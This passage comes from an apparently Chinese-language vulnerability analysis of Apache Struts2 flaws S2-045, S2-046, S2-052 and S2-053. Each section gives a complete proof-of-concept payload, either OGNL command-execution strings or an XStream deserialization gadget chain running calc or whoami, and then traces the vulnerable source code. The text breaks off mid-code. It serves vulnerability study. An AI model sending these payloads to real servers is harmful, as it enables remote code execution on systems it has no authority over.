class=o>=</span><span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>ProcessBuilder</span><span class=o>(</span><span class=err>#</span><span class=n>cmds</span><span class=o>)).(</span><span class=err>#</span><span class=n>p</span><span class=o>.</span><span class=na>redirectErrorStream</span><span class=o>(</span><span class=kc>true</span><span class=o>)).(</span><span class=err>#</span><span class=n>process</span><span class=o>=</span><span class=err>#</span><span class=n>p</span><span class=o>.</span><span class=na>start</span><span class=o>()).(</span><span class=err>#</span><span class=n>ros</span><span class=o>=(</span><span class=nd>@org.apache.struts2.ServletActionContext@getResponse</span><span class=o>().</span><span class=na>getOutputStream</span><span class=o>())).(</span><span class=nd>@org.apache.commons.io.IOUtils@copy</span><span class=o>(</span><span class=err>#</span><span class=n>process</span><span class=o>.</span><span class=na>getInputStream</span><span class=o>(),</span><span class=err>#</span><span class=n>ros</span><span class=o>)).(</span><span class=err>#</span><span class=n>ros</span><span class=o>.</span><span class=na>flush</span><span class=o>())}.</span><span class=na>multipart</span><span class=o>/</span><span class=n>form</span><span class=o>-</span><span class=n>data</span><span class=o>;</span>
</span></span></code></pre></td></tr></table></div></div><p>漏洞的产生原因主要是在使用基于Jakarta插件的文件上传功能时，如果攻击者使用异常的 <code>Content-Type</code> 值，在 <code>org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest#parse(HttpServletRequest request, String saveDir)</code> 中会引发异常错误，并抛出一个 <code>LocalizedMessage</code> 错误：</p><p><img src=/media/image-20210816174039754.png alt=image-20210816174039754></p><p>后续在 <code>org.apache.struts2.interceptor.FileUploadInterceptor#intercept(ActionInvocation invocation)</code> 处理异常：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span><span class=n>multiWrapper</span><span class=o>.</span><span class=na>hasErrors</span><span class=o>())</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>Iterator</span> <span class=n>i$</span> <span class=o>=</span> <span class=n>multiWrapper</span><span class=o>.</span><span class=na>getErrors</span><span class=o>().</span><span class=na>iterator</span><span class=o>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span><span class=o>(</span><span class=n>i$</span><span class=o>.</span><span class=na>hasNext</span><span class=o>())</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>LocalizedMessage</span> <span class=n>error</span> <span class=o>=</span> <span class=o>(</span><span class=n>LocalizedMessage</span><span class=o>)</span><span class=n>i$</span><span class=o>.</span><span class=na>next</span><span class=o>();</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>validation</span> <span class=o>!=</span> <span class=kc>null</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=n>validation</span><span class=o>.</span><span class=na>addActionError</span><span class=o>(</span><span class=n>LocalizedTextUtil</span><span class=o>.</span><span class=na>findText</span><span class=o>(</span><span class=n>error</span><span class=o>.</span><span class=na>getClazz</span><span class=o>(),</span> <span class=n>error</span><span class=o>.</span><span class=na>getTextKey</span><span class=o>(),</span> <span class=n>ActionContext</span><span class=o>.</span><span class=na>getContext</span><span class=o>().</span><span class=na>getLocale</span><span class=o>(),</span> <span class=n>error</span><span class=o>.</span><span class=na>getDefaultMessage</span><span class=o>(),</span> <span class=n>error</span><span class=o>.</span><span class=na>getArgs</span><span class=o>()));</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这里看到调用了 <code>LocalizedTextUtil.findText(error.getClazz(), error.getTextKey(), ActionContext.getContext().getLocale(), error.getDefaultMessage(), error.getArgs())</code> 来处理异常信息，最终就是在这个方法内对异常信息中的Ognl表达式进行了解析，导致RCE。部分调用栈如下：</p><p><img src=/media/image-20210816174522526.png alt=image-20210816174522526></p><p>RCE证明截图如下：</p><p><img src=/media/image-20210816174607952.png alt=image-20210816174607952></p><h2 id=s2-046>S2-046</h2><p>影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p><p>CVE编号：CVE-2017-5638</p><p>POC如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// 注意：末尾的%00b需要手动进行URL解码再发送
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>Content</span><span class=o>-</span><span class=n>Disposition</span><span class=o>:</span> <span class=n>form</span><span class=o>-</span><span class=n>data</span><span class=o>;</span> <span class=n>name</span><span class=o>=</span><span class=s>&#34;upload&#34;</span><span class=o>;</span> <span class=n>filename</span><span class=o>=</span><span class=s>&#34;%{(#nike=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;calc&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}%00b&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>这个漏洞的原理和S2-045是一样的，都是利用后台会使用Ognl解析报错信息导致RCE。这个漏洞的异常抛出位置如下：</p><p><img src=/media/image-20210816181002324.png alt=image-20210816181002324></p><p>异常处理位置和S2-045是一样的：</p><p><img src=/media/image-20210816181140122.png alt=image-20210816181140122></p><p>最终使用Ognl解析异常信息，因为异常信息中包含完整的Ognl表达式导致RCE：</p><p><img src=/media/image-20210816181250528.png alt=image-20210816181250528></p><h2 id=s2-052>S2-052</h2><p>影响版本：Struts 2.1.6 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12</p><p>CVE编号：CVE-2017-9805</p><p>POC如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=c>&lt;!--需要设置请求包的Content-Type为application/xml--&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;map&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;entry&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;jdk.nashorn.internal.objects.NativeString&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;flags&gt;</span>0<span class=nt>&lt;/flags&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;value</span> <span class=na>class=</span><span class=s>&#34;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;dataHandler&gt;</span>
</span></span><span class=line><span class=cl>          <span class=nt>&lt;dataSource</span> <span class=na>class=</span><span class=s>&#34;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;is</span> <span class=na>class=</span><span class=s>&#34;javax.crypto.CipherInputStream&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>              <span class=nt>&lt;cipher</span> <span class=na>class=</span><span class=s>&#34;javax.crypto.NullCipher&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;initialized&gt;</span>false<span class=nt>&lt;/initialized&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;opmode&gt;</span>0<span class=nt>&lt;/opmode&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;serviceIterator</span> <span class=na>class=</span><span class=s>&#34;javax.imageio.spi.FilterIterator&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>                  <span class=nt>&lt;iter</span> <span class=na>class=</span><span class=s>&#34;javax.imageio.spi.FilterIterator&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>                    <span class=nt>&lt;iter</span> <span class=na>class=</span><span class=s>&#34;java.util.Collections$EmptyIterator&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>                    <span class=nt>&lt;next</span> <span class=na>class=</span><span class=s>&#34;java.lang.ProcessBuilder&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>                      <span class=nt>&lt;command&gt;</span>
</span></span><span class=line><span class=cl>                        <span class=nt>&lt;string&gt;</span>calc<span class=nt>&lt;/string&gt;</span>
</span></span><span class=line><span class=cl>                      <span class=nt>&lt;/command&gt;</span>
</span></span><span class=line><span class=cl>                      <span class=nt>&lt;redirectErrorStream&gt;</span>false<span class=nt>&lt;/redirectErrorStream&gt;</span>
</span></span><span class=line><span class=cl>                    <span class=nt>&lt;/next&gt;</span>
</span></span><span class=line><span class=cl>                  <span class=nt>&lt;/iter&gt;</span>
</span></span><span class=line><span class=cl>                  <span class=nt>&lt;filter</span> <span class=na>class=</span><span class=s>&#34;javax.imageio.ImageIO$ContainsFilter&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>                    <span class=nt>&lt;method&gt;</span>
</span></span><span class=line><span class=cl>                      <span class=nt>&lt;class&gt;</span>java.lang.ProcessBuilder<span class=nt>&lt;/class&gt;</span>
</span></span><span class=line><span class=cl>                      <span class=nt>&lt;name&gt;</span>start<span class=nt>&lt;/name&gt;</span>
</span></span><span class=line><span class=cl>                      <span class=nt>&lt;parameter-types/&gt;</span>
</span></span><span class=line><span class=cl>                    <span class=nt>&lt;/method&gt;</span>
</span></span><span class=line><span class=cl>                    <span class=nt>&lt;name&gt;</span>foo<span class=nt>&lt;/name&gt;</span>
</span></span><span class=line><span class=cl>                  <span class=nt>&lt;/filter&gt;</span>
</span></span><span class=line><span class=cl>                  <span class=nt>&lt;next</span> <span class=na>class=</span><span class=s>&#34;string&#34;</span><span class=nt>&gt;</span>foo<span class=nt>&lt;/next&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;/serviceIterator&gt;</span>
</span></span><span class=line><span class=cl>                <span class=nt>&lt;lock/&gt;</span>
</span></span><span class=line><span class=cl>              <span class=nt>&lt;/cipher&gt;</span>
</span></span><span class=line><span class=cl>              <span class=nt>&lt;input</span> <span class=na>class=</span><span class=s>&#34;java.lang.ProcessBuilder$NullInputStream&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>              <span class=nt>&lt;ibuffer&gt;&lt;/ibuffer&gt;</span>
</span></span><span class=line><span class=cl>              <span class=nt>&lt;done&gt;</span>false<span class=nt>&lt;/done&gt;</span>
</span></span><span class=line><span class=cl>              <span class=nt>&lt;ostart&gt;</span>0<span class=nt>&lt;/ostart&gt;</span>
</span></span><span class=line><span class=cl>              <span class=nt>&lt;ofinish&gt;</span>0<span class=nt>&lt;/ofinish&gt;</span>
</span></span><span class=line><span class=cl>              <span class=nt>&lt;closed&gt;</span>false<span class=nt>&lt;/closed&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;/is&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;consumed&gt;</span>false<span class=nt>&lt;/consumed&gt;</span>
</span></span><span class=line><span class=cl>          <span class=nt>&lt;/dataSource&gt;</span>
</span></span><span class=line><span class=cl>          <span class=nt>&lt;transferFlavors/&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;/dataHandler&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;dataLen&gt;</span>0<span class=nt>&lt;/dataLen&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;/value&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/jdk.nashorn.internal.objects.NativeString&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;jdk.nashorn.internal.objects.NativeString</span> <span class=na>reference=</span><span class=s>&#34;../jdk.nashorn.internal.objects.NativeString&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/entry&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;entry&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;jdk.nashorn.internal.objects.NativeString</span> <span class=na>reference=</span><span class=s>&#34;../../entry/jdk.nashorn.internal.objects.NativeString&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;jdk.nashorn.internal.objects.NativeString</span> <span class=na>reference=</span><span class=s>&#34;../../entry/jdk.nashorn.internal.objects.NativeString&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/entry&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/map&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>这个漏洞其实是因为Struts2使用了 <code>XStreamHandler</code> 对前端传来的XML数据进行反序列化时未进行任何过滤，从而导致 <code>XStreamHandler</code> 反序列化漏洞。</p><p>首先看到 <code>struts2-rest-plugin-2.5.12.jar!\struts-plugin.xml</code> 中注册的 <code>ContentTypeHandler</code> ：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;bean</span> <span class=na>type=</span><span class=s>&#34;org.apache.struts2.rest.handler.ContentTypeHandler&#34;</span> <span class=na>name=</span><span class=s>&#34;xml&#34;</span> <span class=na>class=</span><span class=s>&#34;org.apache.struts2.rest.handler.XStreamHandler&#34;</span> <span class=nt>/&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到，如果Content-Type为application/xml，就会调用 <code>org.apache.struts2.rest.handler.XStreamHandler</code> 处理器来进行处理。我们在 <code>org.apache.struts2.rest.handler.ContentTypeHandler#intercept(ActionInvocation invocation)</code> 代码如下所示：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=n>String</span> <span class=nf>intercept</span><span class=o>(</span><span class=n>ActionInvocation</span> <span class=n>invocation</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>Exception</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>HttpServletRequest</span> <span class=n>request</span> <span class=o>=</span> <span class=n>ServletActionContext</span><span class=o>.</span><span class=na>getRequest</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=n>ContentTypeHandler</span> <span class=n>handler</span> <span class=o>=</span> <span class=n>selector</span><span class=o>.</span><span class=na>getHandlerForRequest</span><span class=o>(</span><span class=n>request</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>Object</span> <span class=n>target</span> <span class=o>=</span> <span class=n>invocation</span><span class=o>.</span><span class=na>getAction</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>target</span> <span class=k>instanceof</span> <span class=n>ModelDriven</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>target</span> <span class=o>=</span> <span class=o>((</span><span class=n>ModelDriven</span><span class=o>)</span><span class=n>target</span><span class=o>).</span><span class=na>getModel</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>request</span><span class=o>.</span><span class=na>getContentLength</span><span class=o>()</span> <span class=o>&gt;</span> <span class=n>0</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>InputStream</span> <span class=n>is</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=na>getInputStream</span><span class=o>();</span>
</span></span><span class=line><span class=cl>        <span class=n>InputStreamReader</span> <span class=n>reader</span> <span class=o>=</span> <span class=k>new</span> <span class=n>InputStreamReader</span><span class=o>(</span><span class=n>is</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>handler</span><span class=o>.</span><span class=na>toObject</span><span class=o>(</span><span class=n>reader</span><span class=o>,</span> <span class=n>target</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>invocation</span><span class=o>.</span><span class=na>invoke</span><span class=o>();</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>逻辑很简单， <code>ContentTypeHandler handler = selector.getHandlerForRequest(request)</code> 就是根据Content-Type获取对应的处理器，由于我们的Content-Type为application/xml，所以这里获取的就是 <code>XStreamHandler</code> 对象，最后调用 <code>handler.toObject(reader, target)</code> 对请求进行处理。所以我们继续跟进 <code>XStreamHandler#toObject(reader, target)</code> ：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kt>void</span> <span class=nf>toObject</span><span class=o>(</span><span class=n>Reader</span> <span class=n>in</span><span class=o>,</span> <span class=n>Object</span> <span class=n>target</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>XStream</span> <span class=n>xstream</span> <span class=o>=</span> <span class=n>createXStream</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=n>xstream</span><span class=o>.</span><span class=na>fromXML</span><span class=o>(</span><span class=n>in</span><span class=o>,</span> <span class=n>target</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>发现就是很直接的Xstream反序列化。</p><p><img src=/media/image-20210816184345338.png alt=image-20210816184345338></p><h2 id=s2-053>S2-053</h2><p>影响版本：Struts 2.0.0 - 2.3.33 Struts 2.5 - Struts 2.5.10.1</p><p>CVE编号：CVE-2017-12611</p><p>POC如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=o>%{(</span><span class=err>#</span><span class=n>dm</span><span class=o>=</span><span class=nd>@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</span><span class=o>).(</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>?(</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>=</span><span class=err>#</span><span class=n>dm</span><span class=o>):((</span><span class=err>#</span><span class=n>container</span><span class=o>=</span><span class=err>#</span><span class=n>context</span><span class=o>[</span><span class=err>&#39;</span><span class=n>com</span><span class=o>.</span><span class=na>opensymphony</span><span class=o>.</span><span class=na>xwork2</span><span class=o>.</span><span class=na>ActionContext</span><span class=o>.</span><span class=na>container</span><span class=err>&#39;</span><span class=o>]).(</span><span class=err>#</span><span class=n>ognlUtil</span><span class=o>=</span><span class=err>#</span><span class=n>container</span><span class=o>.</span><span class=na>getInstance</span><span class=o>(</span><span class=nd>@com.opensymphony.xwork2.ognl.OgnlUtil@class</span><span class=o>)).(</span><span class=err>#</span><span class=n>ognlUtil</span><span class=o>.</span><span class=na>getExcludedPackageNames</span><span class=o>().</span><span class=na>clear</span><span class=o>()).(</span><span class=err>#</span><span class=n>ognlUtil</span><span class=o>.</span><span class=na>getExcludedClasses</span><span class=o>().</span><span class=na>clear</span><span class=o>()).(</span><span class=err>#</span><span class=n>context</span><span class=o>.</span><span class=na>setMemberAccess</span><span class=o>(</span><span class=err>#</span><span class=n>dm</span><span class=o>)))).(</span><span class=err>#</span><span class=n>cmd</span><span class=o>=</span><span class=err>&#39;</span><span class=n>whoami</span><span class=err>&#39;</span><span class=o>).(</span><span class=err>#</span><span class=n>iswin</span><span class=o>=(</span><span class=nd>@java.lang.System@getProperty</span><span class=o>(</span><span class=err>&#39;</span><span class=n>os</span><span class=o>.</span><span class=na>name</span><span class=err>&#39;</span><span class=o>).</span><span class=na>toLowerCase</span><span class=o>().</span><span class=na>contains</span><span class=o>(</span><span class=err>&#39;</span><span class=n>win</span><span class=err>&#39;</span><span class=o>))).(</span><span class=err>#</span><span class=n>cmds</span><span class=o>=(</span><span class=err>#</span><span class=n>iswin</span><span class=o>?{</span><span class=err>&#39;</span><span class=n>cmd</span><span class=o>.</span><span class=na>exe</span><span class=sc>&#39;,&#39;</span><span class=o>/</span><span class=n>c</span><span class=err>&#39;</span><span class=o>,</span><span class=err>#</span><span class=n>cmd</span><span class=o>}:{</span><span class=err>&#39;</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span><span class=sc>&#39;,&#39;</span><span class=o>-</span><span class=n>c</span><span class=err>&#39;</span><span class=o>,</span><span class=err>#</span><span class=n>cmd</span><span class=o>})).(</span><span class=err>#</span><span class=n>p</span><span class=o>=</span><span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>ProcessBuilder</span><span class=o>(</span><span class=err>#</span><span class=n>cmds</span><span class=o>)).(</span><span class=err>#</span><span class=n>p</span><span class=o>.</span><span class=na>redirectErrorStream</span><span class=o>(</span><span class=kc>true</span><span class=o>)).(</span><span class=err>#</span><span class=n>process</span><span class=o>=</span><span class=err>#</span><span class=n>p</span><span class=o>.</span><span class=na>start</span><span class=o>()).(</span><span class=nd>@org.apache.commons.io.IOUtils@toString</span><span class=o>(</span><span class=err>#</span><span class=n>process</span><span class=o>.</span><span class=na>getInputStream</span><span class=o>()))}</span>
</span></span></code></pre></td></tr></table></div></div><p>这个漏洞其实归根结底还是由于 <strong>Struts2自定义标签的解析导致的漏洞</strong> 。</p><p>网上大部分人说的：“Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成一个表达式，被OGNL解析第二次，导致任意命令执行漏洞”。并不完全正确，正确的理解应该是： <strong>Struts2的自定义标签进行渲染之前，由于模板会被Freemarker提前解析渲染一次，所以Struts2自定义标签会渲染Freemarker解析后得到的恶意Ognl表达式</strong> 。</p><p>例如如下ftl模板文件：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>S2-053 Demo<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>h1</span><span class=p>&gt;</span>S2-053 Demo<span class=p>&lt;/</span><span class=nt>h1</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>hr</span><span class=p>/&gt;</span>
</span></span><span class=line><span class=cl>Your name: <span class=err>&lt;</span>@s.url value=&#34;${name}&#34;/&gt;
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>hr</span><span class=p>/&gt;</span>
</span></span><span class=line><span class=cl>Enter your name here:<span class=p>&lt;</span><span class=nt>br</span><span class=p>/&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>form</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;&#34;</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;get&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;text&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;name&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;&#34;</span> <span class=p>/&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>input</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;Submit&#34;</span> <span class=p>/&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>其中存在使用Struts2的自定义标签： <code>&lt;@s.url value="${name}"/></code> ，但是标签进行渲染之前，其中的 <code>${name}</code> 会先经过freemarker解析一遍，如下所示，就是freemarker解析 <code>${name}</code> 的值并进行输出：</p><p><img src=/media/image-20210817145324318.png alt=image-20210817145324318></p><p>继续跟进到 <code>env.getOut().write()</code> 中，发现解析 <code>${name}</code> 后得到的值就是我们的恶意Ognl表达式：</p><p><img src=/media/image-20210817145524666.png alt=image-20210817145524666></p><p>按道理此时freemarker的解析就结束了，这个Ognl表达式也不会被freemarker进行解析，但是解析出来的这个Ognl表达式存在位置特殊，这个解析出来的Ognl表达式在Struts2的自定义标签的value属性中：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=err>&lt;</span>@s.url value=&#34;${name}&#34;/&gt;
</span></span></code></pre></td></tr></table></div></div><p>可以看到，这里使用了Struts2的自定义标签，所以经过freemarker解析后，这个标签实际上就相当于：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
